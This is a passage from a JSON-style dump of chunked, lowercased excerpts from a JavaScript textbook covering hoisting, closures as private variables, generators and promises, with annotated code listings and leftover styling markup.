\"kiyokawa\";  secondronin = \"kondo\";  the value kiyokawa is assigned to the identifier firstronin, and then the value kondo is assigned to the identifier secondronin. there's nothing weird about that, right? but take a look at another example:  const firstronin = \"kiyokawa\";  check(firstronin);  function check(ronin) {  assert(ronin === \"kiyokawa\", \"the ronin was checked! \");", "javascript-5.5.3.txt__3": "but if we check, as shown in figure 5.13, you see that all is fine and well. javascript isn't too picky about where we define our functions. we can choose to place function declarations before or even after their respective calls. this isn't something that the developer should need to fuss about.  figure 5.13. the function is indeed visible, even before the execution reaches its definition.  the process of registering identifiers  but ease of use aside, if code is executed line by line, how did the javascript engine know that a function named check exists? it turns out that the javascript engine \u201ccheats\u201d a little, and that execution of javascript code occurs in two phases.", "javascript-5.5.3.txt__4": "the process is as follows:  if we're creating a function environment, the implicit arguments identifier is created, along with all formal function parameters and their argument values. if we're dealing with a nonfunction environment, this step is skipped.", "javascript-5.5.3.txt__5": "the current code is scanned for variable declarations. in function and global environments, all variables declared with the keyword var and defined outside other functions (but they can be placed within blocks!) are found, and all variables declared with the keywords let and const defined outside other functions and blocks are found. in block environments, the code is scanned only for variables declared with the keywords let and const, directly in the current block. for each discovered variable, if the identifier doesn't exist in the environment, the identifier is registered and its value initialized to undefined. but if the identifier exists, it's left with its value.", "javascript-5.5.3.txt__6": "these steps are summarized in figure 5.14.  figure 5.14. the process of registering identifiers, depending on the type of environment  now we'll go through the implications of these rules. you'll see some common javascript conundrums that can lead to weird bugs that are easy to create but tricky to understand. let's start with why we're able to call a function before it's even declared.  calling functions before their declarations", "javascript-5.5.3.txt__7": "listing 5.9. accessing a function before its declaration  assert(typeof fun === \"function\",  \"fun is a function even though its definition isn't reached yet!\");  #a  assert(typeof myfunexp === \"undefined\",  #b  \"but we cannot access function expressions\");  #b  #b  assert(typeof myarrow === \"undefined\",  #b  \"nor arrow functions\");  #b  function fun(){}  #c  var myfunexpr = function(){};  #d  var myarrow = (x) => x;  #d  #a - we can access a function that isn't yet defined, if the function is defined as a function declaration.  #b - we can't access functions that are defined as function expressions or arrow functions.  #c - the fun function is defined as a function declaration.  #d - myfunexpr points to a function expression, and myarrow to an arrow function.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-5.5.3.txt__8": "the javascript engine does this to make things easier for us as developers, allowing us to forward-reference functions and not burdening us with an exact order for placing functions. functions already exist at the time our code starts executing.  notice that this holds only for function declarations. function expressions and arrow functions aren't part of this process, and are created when the program execution reaches their definitions. this is why we can't access the myfunexp and myarrow functions.  overriding functions  the next conundrum to tackle is the problem of overriding function identifiers. let's take a look at another example.  listing 5.10. overriding function identifiers  assert(typeof fun === \"function\", \"we access the function\");  #a  var fun = 3;  #b  assert(typeof fun === \"number\", \"now we access the number\");  #c  function fun(){}  #d  assert(typeof fun === \"number\", \"still a number\");  #e  #a - fun refers to a function.  #b - defines a variable fun and assigns a number to it  #c - fun refers to a number.  #d - a fun function declaration  #e - fun still refers to a number.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in this example, a variable declaration and a function declaration have the same name: fun. if you run this code, you'll see that both asserts pass. in the first assert, the identifier fun refers to a function; and in the second and third, fun refers to a number.", "javascript-5.5.3.txt__9": "in this case, because the identifier fun has been encountered in the second step when function declarations are registered, the value undefined isn't assigned to the variable fun. this is why the first assertion, testing whether fun is a function, passes. after that, we have an assignment statement, var fun = 3, which assigns the number 3 to the identifier fun. by doing this, we lose the reference to the function, and from then on, the identifier fun refers to a number.", "javascript-5.5.3.txt__10": "during the actual program execution, function declarations are skipped, so the definition of the fun function doesn't have any impact on the value of the fun identifier.  variable hoisting  if you've read a bunch of javascript blogs or books explaining identifier resolution, you've probably run into the term hoisting\u2014for example, variable and function declarations are hoisted, or lifted, to the top of a function or global scope.", "javascript-5.6.1.txt__1": "5.6.1. revisiting mimicking private variables with closures", "javascript-5.6.1.txt__2": "listing 5.11. approximate private variables with closures  function ninja() {  var feints = 0;  #a  this.getfeints = function(){  #b  return feints;  #b  };  #b  this.feint = function(){  #c  feints++;  #c  };  #c  var ninja1 = new ninja();  assert(ninja1.feints === undefined,  #d  \"and the private data is inaccessible to us.\");  #d  ninja1.feint();  #e  assert(ninja1.getfeints()=== 1,  #f  \"we're able to access the internal feint count.\");  #f  var ninja2 = new ninja();  #g  assert(ninja2.getfeints()=== 0,  \"the second ninja object gets its own feints variable.\");  #a - declares a variable inside the constructor. because the scope of the variable is limited to inside the constructor, it's a \u201cprivate\u201d variable.  #b - an accessor method for the feints counter  #c - the increment method for the value. because the value is private, no one can screw it up behind our backs; they're limited to the access that we give them via methods.  #d - verifies that we can't get at the variable directly  #e - calls the feint method, which increments the count of the number of times that our ninja has feinted  #f - tests that the increment was performed  #g - when we create a new ninja2 object with the ninja constructor, the ninja2 object gets its own feints variable.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-5.6.1.txt__3": "figure 5.15. private variables are realized as closures that are created by object methods defined in the constructor.", "javascript-5.6.1.txt__4": "the getfeints and feint functions are assigned as methods of the newly created ninja object (which, if you remember from the previous chapter, is accessible through the this keyword). therefore, getfeints and feint will be accessible from outside the ninja constructor function, which in turn leads to the fact that you've effectively created a closure around the feints variable.", "javascript-5.6.1.txt__5": "when we create another ninja object, the ninja2 object, the whole process is repeated. figure 5.16 shows the state of the application after creating the second ninja object.  figure 5.16. the methods of each instance create closures around the \u201cprivate\u201d instance variables.", "javascript-5.6.1.txt__6": "now let's see how things play out when making the ninja2.getfeints() call. figure 5.17 shows the details.", "javascript-5.6.1.txt__7": "before making the ninja2.getfeints() call, our javascript engine is executing global code. our program execution is in the global execution context, which is also the only context in the execution stack. at the same time, the only active lexical environment is the global environment, the environment associated with the global execution context.", "javascript-5.6.1.txt__8": "when making the ninja2.getfeints() call, we're calling the getfeints method of the ninja2 object. because every function call causes the creation of a new execution context, a new getfeints execution context is created and pushed to the execution stack. this also leads to the creation of a new getfeints lexical environment, which is normally used to keep track of variables defined in this function. in addition, the getfeints lexical environment, as its outer environment, gets the environment in which the getfeints function was created, the ninja environment that was active when the ninja2 object was constructed.", "javascript-5.6.1.txt__9": "now let's see how things play out when we try to get the value of the feints variable. first, the currently active getfeints lexical environment is consulted. because we haven't defined any variables in the getfeints function, this lexical environment is empty and our targeted feints variable won't be found in there. next, the search continues in the outer environment of the current lexical environment\u2014in our case, the ninja environment is active when constructing the ninja2 object. this time around, the ninja environment has a reference to the feints variable, and the search is done. it's as simple as that.", "javascript-5.6.1.txt__10": "now that we understand the role that execution contexts and lexical environments play when dealing with closures, we'd like to turn our attention to \u201cprivate\u201d variables and why we keep putting quotes around them. as you might have figured out by now, these \u201cprivate\u201d variables aren't private properties of the object, but are variables kept alive by the object methods created in the constructor. let's take a look at one interesting side effect of this.", "javascript-5.6.2.txt__1": "5.6.2. private variables caveat  in javascript, there's nothing stopping us from assigning properties created on one object to another object. for example, we can easily rewrite the code from listing 5.11 into something like the following.  listing 5.12. private variables are accessed through functions, not through objects!  function ninja() {  var feints = 0;  this.getfeints = function(){  return feints;  };  this.feint = function(){  feints++;  };  var ninja1 = new ninja();  ninja1.feint();  var imposter = {};  imposter.getfeints = ninja1.getfeints;  #a  assert(imposter.getfeints() === 1,  #b  \"the imposter has access to the feints variable!\");  #b  #a - makes the getfeints function of ninja1 accessible through the imposter  #b - verifies that we can access the supposedly private variable of ninja1  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":12,\\\"ch\\\":2},{\\\"line\\\":12,\\\"ch\\\":20}]]\"}  !@%style%@!", "javascript-5.6.3.txt__1": "5.6.3. revisiting the closures and callbacks example  let's go back to our simple animations example with callback timers. this time, we'll animate two objects, as shown in the following listing.  listing 5.13. using a closure in a timer interval callback  <div id=\"box1\">first box</div>  <div id=\"box2\">second box</div>  <script>  function animateit(elementid) {  var elem = document.getelementbyid(elementid);  var tick = 0;  var timer = setinterval(function(){  if (tick < 100) {  elem.style.left = elem.style.top = tick + \"px\";  tick++;  else {  clearinterval(timer);  assert(tick === 100,  \"tick accessed via a closure.\");  assert(elem,  \"element also accessed via a closure.\");  assert(timer,  \"timer reference also obtained via a closure.\" );  }, 10);  animateit(\"box1\");  animateit(\"box2\");  </script>  as you saw earlier in the chapter, we use closures to simplify animating multiple objects on our pages. but now we'll consider lexical environments, as shown in figure 5.19.  figure 5.19. by creating multiple closures, we can do many things at once. every time an interval expires, the callback function reactivates the environment that was active at the time of callback creation. the closure of each callback automatically keeps track of its own set of variables.  every time we call the animateit function, a new function lexical environment is created", "javascript-5.6.txt__1": "5.6. exploring how closures work", "javascript-5.6.txt__2": "closures are irrevocably tightly coupled with scopes. closures are a straightforward side effect of the way scoping rules work in javascript. so in this section, we'll revisit the closure examples from the beginning of the chapter. but this time you'll take advantage of execution contexts and lexical environments that will enable you to grasp how closures work under the hood.", "javascript-5.7.txt__1": "5.7. summary", "javascript-6.1.txt__1": "6.1. making our async code elegant with generators and promises", "javascript-6.1.txt__2": "try {  var ninjas = syncgetjson(\"ninjas.json\");  var missions = syncgetjson(ninjas[0].missionsurl);  var missiondetails = syncgetjson(missions[0].detailsurl);  //study the mission description  catch(e){  //oh no, we weren't able to get the mission details", "javascript-6.1.txt__3": "getjson(\"ninjas.json\", function(err, ninjas){  if(err) {  console.log(\"error fetching list of ninjas\", err);  return;  getjson(ninjas[0].missionsurl, function(err, missions) {  if(err) {  console.log(\"error locating ninja missions\", err);  return;  getjson(missions[0].detailsurl, function(err, missiondetails){  if(err) {  console.log(\"error locating mission details\", err);  return;  //study the intel plan  });  });  });", "javascript-6.1.txt__4": "async(function*(){  #a  try {  const ninjas = yield getjson(\"ninjas.json\");  #b  const missions = yield getjson(ninjas[0].missionsurl);  #b  const missiondescription = yield getjson(missions[0].detailsurl);  #b  //study the mission details  catch(e) {  //oh no, we weren't able to get the mission details  });  #a - a generator function is defined by putting an asterisk right after the function keyword. we can use the new yield keyword in generator functions.  #b - the promises are hidden within the getjson method.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-6.2.1.txt__1": "6.2.1. controlling the generator through the iterator object", "javascript-6.2.1.txt__2": "listing 6.2. controlling a generator through an iterator object  function* weapongenerator(){  #a  yield \"katana\";  #a  yield \"wakizashi\";  #a  const weaponsiterator = weapongenerator();  #b  const result1 = weaponsiterator.next();  #c  assert(typeof result1 === \"object\"  #d  && result1.value === \"katana\"  #d  && !result1.done,  #d  \"katana received!\");  #d  const result2 = weaponsiterator.next();  #e  assert(typeof result2 === \"object\"  #e  && result2.value === \"wakizashi\"  #e  && !result2.done,  #e  \"wakizashi received!\");  #e  const result3 = weaponsiterator.next();  #f  assert(typeof result3 === \"object\"  #f  && result3.value === undefined  #f  && result3.done,  #f  \"there are no more results!\");  #f  #a - defines a generator that will produce a sequence of two weapons  #b - calling a generator creates an iterator through which we control the generator's execution.  #c - calling the iterator's next method requests a new value from the generator.  #d - the result is an object with a returned value and an indicator that tells us whether the generator has more values.  #e - calling next again gets another value from the generator.  #f - when there's no more code to execute, the generator returns \u201cundefined\u201d and indicates that it's done.  !@%style%@!", "javascript-6.2.1.txt__3": "!@%style%@!  as you can see, when we call a generator, a new iterator is created:  const weaponsiterator = weapongenerator();  the iterator is used to control the execution of the generator. one of the fundamental things that the iterator object exposes is the next method, which we can use to control the generator by requesting a value from it:  const result1 = weaponsiterator.next();  as a response to that call, the generator executes its code until it reaches a yield keyword that produces an intermediary result (one item in the generated sequence of items), and returns a new object that encapsulates that result and tells us whether its work is done.  as soon as the current value is produced, the generator suspends its execution without blocking and patiently waits for another value request. this is an incredibly powerful feature that standard functions don't have, a feature that we'll use later to great effect.  in this case, the first call to the iterator's next method executes the generator code to the first yield expression, yield \"katana\", and returns an object with the property value set to katana and the property done set to false, signaling that there are more values to produce.  later, we request another value from the generator, by making another call to the weaponiterator's next method:  const result2 = weaponsiterator.next();  this wakes up the generator from suspension, and the generator continues where it left off, executing its code until another intermediary value is reached: yield \"wakizashi\". this suspends the generator and produces an object carrying wakizashi.  finally, when we call the next method for the third time, the generator resumes its execution. but this time there's no more code to execute, so the generator returns an object with value set to undefined, and done set to true, signaling that it's done with its work.  now that you've seen how to control generators through iterators, you're ready to learn how to iterate over the produced values.  iterating the iterator", "javascript-6.2.1.txt__4": "now we'll take advantage of these facts to use a plain old while loop to iterate over values produced by a generator. see the following listing.  listing 6.3. iterating over generator results with a while loop  function* weapongenerator(){  yield \"katana\";  yield \"wakizashi\";  const weaponsiterator = weapongenerator();  #a  let item;  #b  while(!(item = weaponsiterator.next()).done) {  #c  assert(item !== null, item.value);  #c  #c  #a - creates an iterator  #b - creates a variable in which we'll store items of the generated sequence  #c - on each loop iteration, fetches one value from the generator and outputs its value. stops iterating when the generator has no more values to produce.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  here we again create an iterator object by calling a generator function:  const weaponsiterator = weapongenerator();  we also create an item variable in which we'll store individual values produced by the generator. we continue by specifying a while loop with a slightly complicated looping condition, which we'll break down a bit:  while(!(item = weaponsiterator.next()).done) {  assert(item !== null, item.value)", "javascript-6.2.1.txt__5": "and that's how the for-of loop, from our first generator example, works. the for-of loop is syntactic sugar for iterating over iterators:  for(var item of weapongenerator ()){  assert(item !== null, item);  instead of manually calling the next method of the matching iterator and always checking whether we're finished, we can use the for-of loop to do the exact same thing, only behind the scenes.  yielding to another generator  just as we often call one standard function from another standard function, in certain cases we want to be able to delegate the execution of one generator to another. let's take a look at an example that generates both warriors and ninjas.  listing 6.4. using yield* to delegate to another generator  function* warriorgenerator(){  yield \"sun tzu\";  yield* ninjagenerator();  #a  yield \"genghis khan\";  function* ninjagenerator(){  yield \"hattori\";  yield \"yoshi\";  for(let warrior of warriorgenerator()){  assert(warrior !== null, warrior);  #a - yield* delegates to another generator.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":2,\\\"ch\\\":2},{\\\"line\\\":2,\\\"ch\\\":8}],[{\\\"line\\\":15,\\\"ch\\\":5},{\\\"line\\\":15,\\\"ch\\\":11}],[{\\\"line\\\":15,\\\"ch\\\":0},{\\\"line\\\":15,\\\"ch\\\":43}]]\"}  !@%style%@!  if you run this code, you'll see that the output is sun tzu, hattori, yoshi, genghis khan. generating sun tzu probably doesn't catch you off guard; it's the first value yielded by the warriorgenerator. but the second output, hattori, deserves an explanation.", "javascript-6.2.2.txt__1": "6.2.2. using generators  generating sequences of items is all nice and dandy, but let's get more practical, starting with a simple case of generating unique ids.  using generators to generate ids", "javascript-6.2.2.txt__2": "listing 6.5. using generators for generating ids  function *idgenerator(){  #a  let id = 0;  #b  while(true){  #c  yield ++id;  #c  #c  const iditerator = idgenerator();  #d  const ninja1 = { id: iditerator.next().value };  #e  const ninja2 = { id: iditerator.next().value };  #e  const ninja3 = { id: iditerator.next().value };  #e  assert(ninja1.id === 1, \"first ninja has id 1\");  #f  assert(ninja2.id === 2, \"second ninja has id 2\");  #f  assert(ninja3.id === 3, \"third ninja has id 3\");  #f  #a - defines an idgenerator generator function  #b - a variable that keeps track of ids. this variable can't be modified from outside our generator.  #c - a loop that generates an infinite sequence of ids  #d - an iterator through which we'll request new ids from the generator  #e - requests three new ids  #f - tests that all went ok  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-6.2.2.txt__3": "function *idgenerator(){  let id = 0;  while(true){  yield ++id;  note", "javascript-6.2.2.txt__4": "after defining the generator, we create an iterator object:  const iditerator = idgenerator();  this allows us to control the generator with calls to the iditerator.next() method. this executes the generator until a yield is encountered, returning a new id value that we can use for our objects:  const ninja1 = { id: iditerator.next().value };  see how simple this is? no messy global variables whose value can be accidentally changed. instead, we use an iterator to request values from a generator. in addition, if later we need another iterator for tracking the ids of, for example, samurai, we can initialize a new generator for that.  using generators to traverse the dom", "javascript-6.2.2.txt__5": "listing 6.6. recursive dom traversal  <div id=\"subtree\">  <form>  <input type=\"text\"/>  </form>  <p>paragraph</p>  <span>span</span>  </div>  <script>  function traversedom(element, callback) {  callback(element);  #a  element = element.firstelementchild;  while (element) {  #b  traversedom(element, callback);  #b  element = element.nextelementsibling;  #b  #b  const subtree = document.getelementbyid(\"subtree\");  traversedom(subtree, function(element) {  #c  assert(element !== null, element.nodename);  #c  });  #c  </script>  #a - processes the current node with a callback  #b - traverses the dom of each child element  #c - starts the whole process by calling the traversedom function for our root element  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in this example, we use a recursive function to traverse all descendants of the element with the id subtree, in the process logging each type of node that we visit. in this case, the code outputs div, form, input, p, and span.  we've been writing such dom traversal code for a while now, and it has served us perfectly fine. but now that we have generators at our disposal, we can do it differently; see the following code.  listing 6.7. iterating over a dom tree with generators  function* domtraversal(element){  yield element;  element = element.firstelementchild;  while (element) {  yield* domtraversal(element);  #a  element = element.nextelementsibling;  const subtree = document.getelementbyid(\"subtree\");  for(let element of domtraversal(subtree)) {  #b  assert(element !== null, element.nodename);  #b  #b  #a - uses yield* to transfer the iteration control to another instance of the domtraversal generator  #b - iterates over the nodes by using the for-of loop  !@%style%@!", "javascript-6.2.2.txt__6": "!@%style%@!", "javascript-6.2.2.txt__7": "this example is a particulary good one, because it also shows how to use generators in order to separate the code that's producing values (in this case, html nodes) from the code that's consuming the sequence of generated values (in this case, the for-of loop that logs the visited nodes), without having to resort to callbacks. in addition, using iterations is, in certain cases, much more natural than recursion, so it's always good to have our options open.", "javascript-6.2.3.txt__1": "6.2.3. communicating with a generator", "javascript-6.2.3.txt__2": "sending values as generator function arguments  the easiest way to send data to a generator is by treating it like any other function and using function call arguments. take a look at the following listing.  listing 6.8. sending data to and receiving data from a generator  function* ninjagenerator(action) {  #a  const imposter = yield (\"hattori \" + action);  #b  assert(imposter === \"hanzo\",  #c  \"the generator has been infiltrated\");  #c  yield (\"yoshi (\" + imposter + \") \" + action);  const ninjaiterator = ninjagenerator(\"skulk\");  #d  const result1 = ninjaiterator.next();  #e  assert(result1.value === \"hattori skulk\", \"hattori is skulking\");  #e  const result2 = ninjaiterator.next(\"hanzo\");  #f  assert(result2.value === \"yoshi (hanzo) skulk\",  #f  \"we have an imposter!\");  #f  #a - a generator can receive standard arguments, like any other function.  #b - the magic happens. by yielding a value, the generator returns an intermediary calculation. by calling the iterator's next method with an argument, we send data back to the generator.  #c - the value sent over next becomes the value of the yielded expression, so our imposter is hanzo.  #d - normal argument passing  #e - triggers the execution of the generator and checks that we get the correct value  #f - sends data to the generator as an argument to the next method and checks whether the value was correctly transferred  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-6.2.3.txt__3": "using the next method to send values into a generator", "javascript-6.2.3.txt__4": "figure 6.3. the first call to ninjaiterator.next() requests a new value from the generator, which returns hattori skulk and suspends the execution of the generator at the yield expression. the second call to ninjaiterator.next(\"hanzo\") requests a new value, but also sends the argument hanzo into the generator. this value will be used as the value of the whole yield expression, and the variable imposter will now carry the value hanzo.", "javascript-6.2.3.txt__5": "in this example, we have two calls to the ninjaiterator's next method. the first call, ninjaiterator.next(), requests the first value from the generator. because our generator hasn't started executing, this call starts the generator, which calculates the value of the expression \"hattori \" + action, yields the hattori skulk value, and suspends the generator's execution. there's nothing special about this; we've done something similar multiple times throughout this chapter.", "javascript-6.2.3.txt__6": "the interesting thing happens on the second call to the ninjaiterator's next method: ninjaiterator.next(\"hanzo\"). this time, we're using the next method to pass data back to the generator. our generator function is patiently waiting, suspended at the expression yield (\"hattori \" + action), so the value hanzo, passed as the argument to next(), is used as the value of the whole yield expression. in our case, this means that the variable imposter in imposter = yield (\"hattori \" + action) will end up with the value hanzo.", "javascript-6.2.3.txt__7": "that's how we achieve two-way communication with a generator. we use yield to return data from a generator, and the iterator's next() method to pass data back to the generator.  note", "javascript-6.2.3.txt__8": "throwing exceptions  there's another, slightly less orthodox, way to supply a value to a generator: by throwing an exception. each iterator, in addition to having a next method, has a throw method that we can use to throw an exception back to the generator. again, let's look at a simple example.  listing 6.9. throwing exceptions to generators  function* ninjagenerator() {  try{  yield \"hattori\";  fail(\"the expected exception didn't occur\");  #a  catch(e){  #b  assert(e === \"catch this!\", \"aha! we caught an exception\");  #b  #b  const ninjaiterator = ninjagenerator();  const result1 = ninjaiterator.next();  #c  assert(result1.value === \"hattori\", \"we got hattori\");  #c  ninjaiterator.throw(\"catch this!\");  #d  #a - this fail shouldn't be reached.  #b - catches exceptions and tests whether we've received the expected exception  #c - pulls one value from the generator  #d - throws an exception to the generator  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  listing 6.9 starts similarly to listing 6.8, by specifying a generator called ninjagenerator. but this time, the body of the generator is slightly different. we've surrounded the whole function body code with a try-catch block:  function* ninjagenerator() {  try{  yield \"hattori\";  fail(\"the expected exception didn't occur\");  catch(e){  assert(e === \"catch this!\", \"aha! we caught an exception\");  we then continue by creating an iterator, and getting one value from the generator:  const ninjaiterator = ninjagenerator();  const result1 = ninjaiterator.next();  finally, we use the throw method, available on all iterators, to throw an exception back to the generator:  ninjaiterator.throw(\"catch this!\");  by running this listing, we can see that our exception throwing works as expected, as shown in figure 6.4.  figure 6.4. we can throw exceptions to generators from outside a generator.", "javascript-6.2.4.txt__1": "6.2.4. exploring generators under the hood", "javascript-6.2.4.txt__2": "suspended start\u2014 when the generator is created, it starts in this state. none of the generator's code is executed.  executing\u2014 the state in which the code of the generator is executed. the execution continues either from the beginning or from where the generator was last suspended. a generator moves to this state when the matching iterator's next method is called, and there exists code to be executed.  suspended yield\u2014 during execution, when a generator reaches a yield expression, it creates a new object carrying the return value, yields it, and suspends its execution. this is the state in which the generator is paused and is waiting to continue its execution.  completed\u2014 if during execution the generator either runs into a return statement or runs out of code to execute, the generator moves into this state.  figure 6.5 illustrates these states.  figure 6.5. during execution, a generator moves between states triggered by calls to the matching iterator's next method.  now let's supplement this on an even deeper level, by seeing how the execution of generators is tracked with execution contexts.  tracking generators with execution contexts", "javascript-6.2.4.txt__3": "function* ninjagenerator(action) {  yield \"hattori \" + action;  return \"yoshi \" + action;  const ninjaiterator = ninjagenerator(\"skulk\");  const result1 = ninjaiterator.next();  const result2 = ninjaiterator.next();  here we reuse our generator that produces two values: hattori skulk and yoshi skulk.", "javascript-6.2.4.txt__4": "figure 6.6. the state of the execution context stack before calling the ninjagenerator function , and when calling the ninjagenerator function  when we make the call to the ninjagenerator function  const ninjaiterator = ninjagenerator(\"skulk\");", "javascript-6.2.4.txt__5": "an interesting thing happens when the program execution leaves the generator, as shown in figure 6.7. typically, when program execution returns from a standard function, the matching execution context is popped from the stack and completely discarded. but this isn't the case with generators.  figure 6.7. the state of the application when returning from the ninjagenerator call", "javascript-6.2.4.txt__6": "another interesting thing happens when we call the next method on the iterator:  const result1 = ninjaiterator.next();", "javascript-6.2.4.txt__7": "figure 6.8. calling the iterator's next method reactivates the execution context stack item of the matching generator, pushes it on the stack, and continues where it left off the last time.  figure 6.8 illustrates a crucial difference between standard functions and generators. standard functions can only be called anew, and each call creates a new execution context. in contrast, the execution context of a generator can be temporarily suspended and resumed at will.  in our example, because this is the first call to the next method, and the generator hasn't started executing, the generator starts its execution and moves to the executing state. the next interesting thing happens when our generator function reaches this point:  yield \"hattori \" + action", "javascript-6.2.4.txt__8": "figure 6.9. after yielding a value, the generator's execution context is popped from the stack (but isn't discarded, because ninjaiterator keeps a reference to it), and the generator execution is suspended (the generator moves to the suspended yield state).  the code continues by reaching another iterator call:  const result2 = ninjaiterator.next();", "javascript-6.2.4.txt__9": "uff, this was something! we went deep into how generators work under the hood to show you that all the wonderful benefits of generators are a side effect of the fact that a generator's execution context is kept alive if we yield from a generator, and not destroyed as is the case with return values and standard functions.", "javascript-6.2.txt__1": "6.2. working with generator functions", "javascript-6.2.txt__2": "the following listing provides a simple example of using a generator to generate a sequence of weapons.  listing 6.1. using a generator function to generate a sequence of values  function* weapongenerator(){  #a  yield \"katana\";  #b  yield \"wakizashi\";  #b  yield \"kusarigama\";  #b  for(let weapon of weapongenerator()) {  #c  assert(weapon !== undefined, weapon);  #c  #c  #a - defines a generator function by putting * after the function keyword  #b - generates individual values by using the new yield keyword  #c - consumes the generated sequence with the new for-of loop  !@%style%@!", "javascript-6.2.txt__3": "!@%style%@!", "javascript-6.2.txt__4": "figure 6.1. add an asterisk (*) after the function keyword to define a generator.  in this example, we create a generator called weapongenerator that produces a sequence of weapons: katana, wakizashi, and kusarigama. one way of consuming that sequence of weapons is by using a new kind of loop, the for-of loop:  for(let weapon of weapongenerator()) {  assert(weapon, weapon);  the result of invoking this for-of loop is shown in figure 6.2. (for now, don't worry much about the for-of loop, as we'll explore it later.)  figure 6.2. the result of iterating over our weapongenerator()", "javascript-6.3.1.txt__1": "6.3.1. understanding the problems with simple callbacks", "javascript-6.3.1.txt__2": "for example, fetching a json file from a server is a long-running task, during which we don't want to make the application unresponsive for our users. therefore, we provide a callback that will be invoked when the task is done:  getjson(\"data/ninjas.json\", function() {  /*handle results*/  });  naturally, during this long-running task, errors can happen. and the problem with callbacks is that you can't use built-in language constructs, such as try-catch statements, in the following way:  try {  getjson(\"data/ninjas.json\", function() {  //handle results  });  } catch(e) {/*handle errors*/}", "javascript-6.3.1.txt__3": "after we've performed a long-running task, we often want to do something with the obtained data. this can lead to starting another long-running task, which can eventually trigger yet another long-running task, and so on\u2014leading to a series of interdependent, asynchronous, callback-processed steps. for example, if we want to execute a sneaky plan to find all ninjas at our disposal, get the location of the first ninja, and send him some orders, we'd end up with something like this:", "javascript-6.3.1.txt__4": "getjson(\"data/ninjas.json\", function(err, ninjas){  getjson(ninjas[0].location, function(err, locationinfo){  sendorder(locationinfo, function(err, status){  /*process status*/  })  })  });", "javascript-6.3.1.txt__5": "sometimes, the steps that we have to go through to get to the final result don't depend on each other, so we don't have to make them in sequence. instead, to save precious milliseconds, we can do them in parallel. for example, if we want to set a plan in motion that requires us to know which ninjas we have at our disposal, the plan itself, and the location where our plan will play out, we could take advantage of jquery's get method and write something like this:", "javascript-6.3.1.txt__6": "var ninjas, mapinfo, plan;  $.get(\"data/ninjas.json\", function(err, data){  if(err) { processerror(err); return; }  ninjas = data;  actionitemarrived();  });  $.get(\"data/mapinfo.json\", function(err, data){  if(err) { processerror(err); return; }  mapinfo = data;  actionitemarrived();  });  $.get(\"plan.json\", function(err, data) {  if(err) { processerror(err); return; }  plan = data;  actionitemarrived ();  });  function actionitemarrived(){  if(ninjas != null && mapinfo != null && plan != null){  console.log(\"the plan is ready to be set in motion!\");  function processerror(err){  alert(\"error\", err)", "javascript-6.3.1.txt__7": "when presenting the first problem with callbacks\u2014dealing with errors\u2014we showed how we can't use some of the fundamental language constructs, such as try-catch statements. a similar thing holds with loops: if you want to perform asynchronous actions for each item in a collection, you have to jump through some more hoops to get it done.", "javascript-6.3.1.txt__8": "it's true that you can make a library to simplify dealing with all these problems (and many people have). but this often leads to a lot of slightly different ways of dealing with the same problems, so the people behind javascript have bestowed upon us promises, a standard approach for dealing with asynchronous computation.", "javascript-6.3.2.txt__1": "6.3.2. diving into promises  a promise is an object that serves as a placeholder for a result of an asynchronous task. it represents a value that we don't have but hope to have in the future. for this reason, during its lifetime, a promise can go through a couple of states, as shown in figure 6.10.  figure 6.10. states of a promise", "javascript-6.3.2.txt__2": "the following listing provides a closer look at what's going on when we use promises.  listing 6.11. a closer look at promise order of execution  report(\"at code start\");  var ninjadelayedpromise = new promise((resolve, reject) => {  report(\"ninjadelayedpromise executor\");  #a  settimeout(() => {  #b  report(\"resolving ninjadelayedpromise\");  #b  resolve(\"hattori\");  #b  }, 500);  #b  });  assert(ninjadelayedpromise !== null, \"after creating ninjadelayedpromise\");  ninjadelayedpromise.then(ninja => {  #c  assert(ninja === \"hattori\",  #c  \"ninjadelayedpromise resolve handled with hattori\");  #c  });  #c  const ninjaimmediatepromise = new promise((resolve, reject) => {  #d  report(\"ninjaimmediatepromise executor. immediate resolve.\");  #d  resolve(\"yoshi\");  #d  });  #d  ninjaimmediatepromise.then(ninja => {  #e  assert(ninja === \"yoshi\",  #e  \"ninjaimmediatepromise resolve handled with yoshi\");  #e  });  #e  report(\"at code end\");  #a - calling the promise constructor immediately invokes the passed-in function.  #b - we'll resolve this promise as successful after a 500ms timeout expires.  #c - the promise then method is used to set up a callback that will be called when the promise resolves, in our case when the timeout expires.  #d - creates a new promise that gets immediately resolved  #e - sets up a callback to be invoked when the promise resolves. but our promise is already resolved!  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  the code in listing 6.11 outputs the results shown in figure 6.11. as you can see, the code starts by logging the \u201cat code start\u201d message by using our custom-made report function (appendix c) that outputs the message onscreen. this enables us to easily track the order of execution.  figure 6.11. the result of executing listing 6.11  next we create a new promise by calling the promise constructor. this immediately invokes the executor function in which we set up a timeout:  settimeout(() => {  report(\"resolving ninjadelayedpromise\");  resolve(\"hattori\");  }, 500);  the timeout will resolve the promise after 500ms. this could have been any other asynchronous task, but we chose the humble timeout because of its simplicity.", "javascript-6.3.2.txt__3": "next we use the then method on the 